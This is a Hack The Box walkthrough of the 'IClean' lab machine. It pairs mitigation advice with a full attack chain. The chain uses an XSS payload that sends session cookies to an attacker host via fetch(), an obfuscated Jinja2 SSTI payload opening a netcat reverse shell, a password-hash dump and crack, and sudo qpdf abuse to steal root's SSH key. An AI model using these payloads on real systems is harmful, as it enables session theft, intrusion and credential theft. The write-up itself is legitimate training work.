---
layout: post
title: IClean - XSS, SSTI, and Sudo abuse.
date: 2024-05-27 10:14:00-0400
description: IClean - Hack The Box walkthrough.
tags: medium-box HTB XSS Reflected-XSS Cross-Site-Scripting SSTI Server-Side-Template-Injection cookies cookie-manipulation session-hijacking command-injection sudo-misconfiguration secure-coding hardcoded-credentials cracking-hashes mysql
categories: HTB-Machines
thumbnail: /assets/img/2024/iclean/icleancard.png
giscus_comments: false
related_posts: true
toc:
  sidebar: left
featured: false
---


# Introduction
IClean is rated as a medium difficulty. It begins with enumerating a Flask web app and exploiting a XSS vulnerability to steal a session cookie. The cookie is used to bypass the `/login` page authentication and access a `/dashboard` page. An SSTI vulnerability is exploited on this page to establish remote code execution. Due to hardcoded credentials in a python script, hashes are dumped from a database. One hash is cracked, which enables lateral movement to a standard user's account. The standard user has `sudo` rights over a binary, which is exploited to exfiltrate the `root` user's `/id_rsa` file to achieve privilege escalation.


## Vulnerabilities explored

### Cross-Site Scripting scripting
As discussed in [Headless walkthrough](https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored), Cross-Site Scripting (XSS) is a type of vulnerability that allows a threat actor to inject a malicious payload into content that other users will view. When the content is viewed, the malicious payload will be executed, which can lead to data theft, session hijacking, and other types of breaches. See the linked article for a deeper explanation on XSS vulnerabilities.


### Session hijacking
Also discussed in the [Headless walkthrough](https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored), session hijacking involves exploiting a session by stealing or predicting a valid token. The token can then be used to bypass authentication mechanisms and/or steal data.
#### Mitigation

Some additional mitigation to what was discussed in the [Headless walkthrough](https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored) article include:

- **Use HTTPS**: Ensure all communication between the client and server is encrypted using HTTPS to prevent session hijacking via network sniffing.
- **User-Agent and IP Binding**: Bind the session to the user's IP address and User-Agent string to make session hijacking more difficult.


### Server-Side Template Injection
Server-Side Template Injection (SSTI) occurs when a a threat actor exploits a web application's template rendering system by injecting malicious code into the templates. This happens when the template engine fails to properly distinguish between the template code and user-provided data meant to populate the placeholders. As a result, the injected code is processed as part of the template, leading to the execution of malicious payloads.
#### Mitigation

To avoid SSTI vulnerabilities the following can be considered:

- **Input Validation**: Validate and sanitise all user inputs to ensure they do not contain executable code.
- **Use Secure Templates**: Choose template engines that offer built-in security features and avoid using insecure or outdated ones.
- **Escape User Inputs**: Always escape user inputs before including them in templates to prevent execution as code.
- **Whitelist Inputs**: Use a whitelist approach to limit the types of data that can be included in templates.
- **Limit Template Functionality**: Restrict the capabilities of the template engine to minimise the risk of code execution.
- **Separate Data and Code**: Ensure a clear separation between the template logic and user data to prevent mixing executable code with user inputs.
- **Security Audits**: Regularly perform security audits and code reviews to identify and fix potential SSTI vulnerabilities.
- **Keep Dependencies Updated**: Regularly update the template engine and other dependencies to the latest versions with security patches.


### Insecure coding - hardcoded credentials
Similarly to [Headless](https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored), insecure coding practices can lead to significant attack vectors. In this case, credentials for a database were hardcoded, which enabled lateral movement.
#### Mitigation

- **Environment variables:** Store credentials in environment variables rather than in the source code. 

```python
import os
db_password = os.getenv('DB_PASSWORD')
```

- **Configuration files:** Use configuration files that are not included in version control to store credentials and sensitive information, ensuring these files are secured with appropriate permissions.

```json
{
  "db_password": "your_password"
}
```

- **Secrets Management Tools**: Use dedicated secrets management tools like AWS Secrets Manager or Azure Key Vault.
- **Secrets Rotation**: Regularly rotate secrets and credentials to reduce the risk of compromised credentials.
- **Secure Code Reviews**: Conduct regular code reviews with a focus on security to identify and remediate hardcoded credentials and other insecure coding practices.
### Sudo misconfiguration
As discussed in [Headless](https://emdeh.com/blog/2024/headleass-walkthrough/#vulnerabilities-explored), the `sudoers` file controls which users can execute commands with elevated privileges. If this file is configured to allow a user to run certain commands as the superuser.

Some binaries, when executed with elevated privileges, can be used to perform tasks that compromise the security of the system. For instance, if a binary allows file manipulation, a threat actor can use it to gain higher privileges or conduct further exfiltration of sensitive data. 


## Tools
- Nmap
- Gobuster
-  Burpsuite
- Hashcat

## Tactics and Methods

### Enumerating webpages
- Gobuster was used to enumerate pages of the site, which identified the target page `/dashboard`.

### Stealing cookies by exploiting a Reflected XSS vulnerability
- Burpsuite was used to observer the HTTP requests while using the target site, ultimately leading to the identification of a XSS vulnerability and the exfiltration of a session cookie.

### Authentication bypass via session hijacking
- Authentication to the target page `/dashboard` was achieved by using the stolen cookie to hijack a session.

### Remote code execution by exploiting a SSTI vulnerability
- The SSTI vulnerability in the `/QRGenerator` was exploited to achieve remote code execution and establish a reverse shell within the context of the `www-data` user.

### Brute-forcing hashed passwords
- Hashcat was used to crack the hashes stolen from the `users` database and compromise a standard user's account.

### Abusing `sudo` to exfiltrate sensitive data and achieve privilige escalation
- Privilege escalation was achieved by stealing the `root` user's `id_rsa` file by exploiting a vulnerability in the `qpdf` binary that the compromised user had `sudo` rights over.


---
# Enumeration

## Nmap scanning

As always, the target is scanned with Nmap.

```bash
┌──(emdeh㉿kali)-[~/Documents/htb-machines/iclean/scans]
└─$ nmap -A 10.129.10.21 | tee nmap-output.txt
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 01:21 EDT
Nmap scan report for 10.129.10.21
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.79 seconds
```
### Findings

1. Port 22
2. Port 80

## Port 80 Enumeration

Navigating to the site results in Server Not Found but reveals the domain: `http://capiclean.htb/`.

Adding to `/etc/hosts/` file resolves the target to a landing page:

<img src="/assets/img/2024/iclean/icleanmimetypes.png" alt="icleanmimetypes.png" class="auto-resize">

There is a login page at `capiclean.htb/login`, and a page to submit a quotes at `capiclean.htb/quote`.

## Further page enumeration

Further enumeration was conducted with Gobuster:

```bash
(emdeh㉿kali)-[~/Documents/htb-machines/iclean/scans]
└─$ gobuster dir -u http://capiclean.htb -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 100 -x php,html -o gobuster-scan.txt
```

This command uses Gobuster to brute-force directories (pages) on the site.

- **`gobuster dir`**: This tells Gobuster to use its directory and file brute-forcing mode.
- `**-u http://capiclean.htb**`: Specifies the target URL to be scanned,
- `**-w /usr/share/wordlists/dirbuster/directory-list-1.0.txt**:` Specifies the path to the wordlist that Gobuster will use for brute-forcing. 
- `**-t 100**`: Sets the number of concurrent threads to use for the scan. In this case, Gobuster will use 100 threads to speed up the process.
- `**-x php,html**`: Specifies the file extensions to append to each word in the wordlist. Gobuster will check for both `.php` and `.html` extensions.
- `**-o gobuster-scan.txt**`: Specifies the output file where the results will be saved. The results of this scan will be written to `gobuster-scan.txt`.

Early results reveal a `/dashboard` page with a status code of 302, suggesting it was found but redirected to the root of the site; presumably because it is behind the `/login` page. This is likely the target page.

<img src="/assets/img/2024/iclean/icleanlandingpage.png" alt="icleanlandingpage.png" class="auto-resize">

## Quote page enumeration

Observing the POST request for the `/quote` page in Burpsuite reveals the server will accept image types. This may lead to the possibility of exfiltrating cookies via XSS.

<img src="/assets/img/2024/iclean/iclean302dashboard.png" alt="iclean302dashboard.png" class="auto-resize">


# Initial access

## XSS to exfiltrate cookies

Given there was a login page, it may be possible to perform an XSS attack to extract session cookies and impersonate a user by appending the following to the URL parameter in the POST request:

```html
service=<img src=x onerror=fetch("http://IP:4444/"+document.cookie);>
```

This attempts to exfiltrate cookies to a remote server.

- `&service=`: This part of the string is the URL parameter named `service`.
- `<img src=x onerror=...>`: This is an HTML `img` tag. Normally, the `src` attribute specifies the path to the image. However, in this case, an `x` is used to trigger an error event.
- `onerror=...`: The `onerror` attribute is an event handler that executes JavaScript code when an error occurs while loading the image (because `src=x` will fail).
- `fetch("http://RemoteIP:4444/"+document.cookie);`: This JavaScript code is executed when the image fails to load. It uses the `fetch` function to make an HTTP request to the attacker's server (`http://ATTACK_IP:4444/`). The `+document.cookie` part appends the document’s cookies to the URL, effectively sending them to the attacker's server.

Repeating the POST request after adding the payload, and URL-encoding it, looks like this:

<img src="/assets/img/2024/iclean/icleanXSSpayload.png" alt="icleanXSSpayload.png" class="auto-resize">

Starting a listener captures the cookie as expected:

```bash
┌──(emdeh㉿kali)-[~/Documents/htb-machines/iclean/credentials]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.10.21] 56354
GET /session=eyJyb2xlIjoiMj<SNIP>.0qvcHllPTlaUvubvwVzl77I1glM HTTP/1.1
Host: 10.10.14.6:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:3000
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

## Session hijacking with stolen cookie

The cookie can be used to impersonate a session. By inspecting the login page, the cookie can be added to storage. Then, attempting to browse to the `/dashboard` page, which would typically sit behind the login page, can be done by simply changing the URL.

<img src="/assets/img/2024/iclean/icleansessionhijack.png" alt="icleansessionhijack.png" class="auto-resize">

As the session will use the stolen cookie, the page loads as expected.

<img src="/assets/img/2024/iclean/icleandashboardpage.png" alt="icleandashboardpage.png" class="auto-resize">

## Dashboard enumeration

Generating an invoice, then using the invoice number to generate a QR creates a link that can then be submitted to return a scannable invoice.

<img src="/assets/img/2024/iclean/icleaninvoice.png" alt="icleaninvoice.png" class="auto-resize">

Observing the resulting POST request in Burpsuite suggests this may be the vector to obtain a reverse shell through a Server-Side Template Injection (SSTI).

## Server-Side Template Injection for a reverse shell

### Identifying the Template engine

The HTTP headers reveal the server is using the `Werkzeug/2.3.7` utility library for Python, which is common for Flask applications. Flask typically defaults to using `Jinja2` for templating.

- **Werkzeug**: Provides the underlying Web Server Gateway Interface (WSGI) functionality and utilities for Flask.
- **Flask**: A web framework that uses Werkzeug and often Jinja2 for templating.
- **Jinja2**: The default template engine used by Flask for rendering HTML templates.
### Testing

Using simple payloads can confirm if SSTI is possible. e.g., `{{ 7*7 }}`.

The diagram below from [PortsSwigger](https://portswigger.net/research/server-side-template-injection) can help confirm if an SSTI vulnerability is present and also identify the underlying template engine.

<img src="/assets/img/2024/iclean/portswiggerssti.png" alt="portswiggerssti.png" class="auto-resize">


### **Construct the Malicious Payload**

Assuming Jinja2, and with the help of [A Simple Flask (Jinja2) Server-Side Template Injection (SSTI) Example (kleiber.me)](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/) the following payload was constructed:


```{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.9%204000%20%3E%2Ftmp%2Ff")|attr("read")()}}```

URL-encoding and inputting the payload into the vulnerable parameter and sending the request results in a shell.

<img src="/assets/img/2024/iclean/icleanqrgenhttp.png" alt="icleanqrgenhttp.png" class="auto-resize">


<img src="/assets/img/2024/iclean/icleannclistener.png" alt="icleannclistener.png" class="auto-resize">

### Stabilising the shell

The shell can be stabilised with the following python command.

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```


# Lateral movement

## Stealing hashes

In the present working directory, there is an `app.py` script. Within it are hardcoded credentials for a database.

```
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': '<SNIP>',
    'database': 'capiclean'
```

At the start of the script there is a import for `pymysql`, confirming the type of database to be MySQL.

As the Database is running locally, it can be connected to by passing the `username` and inputting the `password` when prompted:

<img src="/assets/img/2024/iclean/icleanmysqlauth.png" alt="icleanmysqlauth.png" class="auto-resize">

Listing the databases finds one named `capiclean`.

```mysql
mysql> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| capiclean          |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)
```

Switching to `capiclean` and listing tables reveals a table of `users`.

```mysql
mysql> USE capiclean;
USE capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)
```


### Dumping database table

Selecting all rows from the `users` table reveals two rows with hashed passwords.

<img src="/assets/img/2024/iclean/icleandbhashes.png" alt="icleandbhashes.png" class="auto-resize">

## Cracking the hash

The hash is most likely a `SHA-256`.

```bash
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

Please specify the hash-mode with -m [hash-mode].

Started: Sun May 26 20:00:37 2024
Stopped: Sun May 26 20:00:39 2024
```

Using Hashcat with `-m 1400` cracks it.

<img src="/assets/img/2024/iclean/icleancrackedhash.png" alt="icleancrackedhash.png" class="auto-resize">

## Logging in via SSH

The stolen password can now be used to login via SSH, and the first flag is found.

```bash
──(emdeh㉿kali)-[~/Documents/htb-machines/iclean/credentials]
└─$ ssh consuela@capiclean.htb
The authenticity of host 'capiclean.htb (10.129.11.43)' can't be established.
ED25519 key fingerprint is SHA256:3nZua2j9n72tMAHW1xkEyDq3bjYNNSBIszK1nbQMZfs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'capiclean.htb' (ED25519) to the list of known hosts.
consuela@capiclean.htb's password:
<SNIP>
consuela@iclean:~$ pwd
/home/consuela
consuela@iclean:~$ ls
user.txt
consuela@iclean:~$ cat user.txt
<SNIP>
```


# Privilege escalation

## Abusing sudo

Checking `sudo` rights, reveals a binary that the `consuela` user can run.

```bash
consuela@iclean:~$ sudo -l
[sudo] password for consuela:
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

> ***The `qpdf` binary is a program and C++ library for structural, content-preserving transformations on PDF files.***

The usage help menu gives some clues about the utility.

```bash
consuela@iclean:~$ qpdf --help=usage
Read a PDF file, apply transformations or modifications, and write
a new PDF file.

Usage: qpdf [infile] [options] [outfile]
   OR  qpdf --help[={topic|--option}]

- infile, options, and outfile may be in any order as long as infile
  precedes outfile.
- Use --empty in place of an input file for a zero-page, empty input
- Use --replace-input in place of an output file to overwrite the
  input file with the output
- outfile may be - to write to stdout; reading from stdin is not supported
- @filename is an argument file; each line is treated as a separate
  command-line argument
- @- may be used to read arguments from stdin
- Later options may override earlier options if contradictory

Related options:
  --empty: use empty file as input
  --job-json-file: job JSON file
  --replace-input: overwrite input with output

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

After reading the [documentation]([GitHub - qpdf/qpdf: QPDF: A content-preserving PDF document transformer](https://github.com/qpdf/qpdf)), it seems there is an option to add a file to an empty pdf and convert it a `qdf` format, which would typically be used to debug or analyse the inner details of a legitimate pdf.

As the user can run the binary as `sudo`, this can be exploited to exfiltrate data that would otherwise be inaccessible to the `consuela` user.

## Exfiltrating sensitive data

For example, the following command has appended the `root` flag from `/root/` to a new file that is accessible to the current user.

```bash
consuela@iclean:~$ sudo /usr/bin/qpdf --empty /tmp/test.txt --qdf --add-attachment /root/root.txt --
consuela@iclean:~$ cat /tmp/test.txt | grep -A 30 "root"
<SNIP>
```

But that's too easy. The `admin` user's `id_rsa` file could also be exfiltrated:

```bash
consuela@iclean:~$ sudo /usr/bin/qpdf --empty /tmp/id_rsa --qdf --add-attachment /root/.ssh/id_rsa --
consuela@iclean:~$ cat /tmp/id_rsa | grep -A 10 "BEGIN" /tmp/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1<SNIP>
-----END OPENSSH PRIVATE KEY-----
endstream
endobj
consuela@iclean:~$
```

Taking the key and adding it to a file with `chmod 600` permissions

```bash
┌──(emdeh㉿kali)-[~/Documents/htb-machines/iclean/credentials]
└─$ nano id_rsa_admin
┌──(emdeh㉿kali)-[~/Documents/htb-machines/iclean/credentials]
└─$ chmod 600 id_rsa_admin
┌──(emdeh㉿kali)-[~/Documents/htb-machines/iclean/credentials]
└─$ ssh -i id_rsa_admin root@capiclean.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
<SNIP?
root@iclean:~# pwd
/root
root@iclean:~# ls
root.txt  scripts
root@iclean:~# cat root.txt
33e5361<SNIP>
```

And the root flag is found.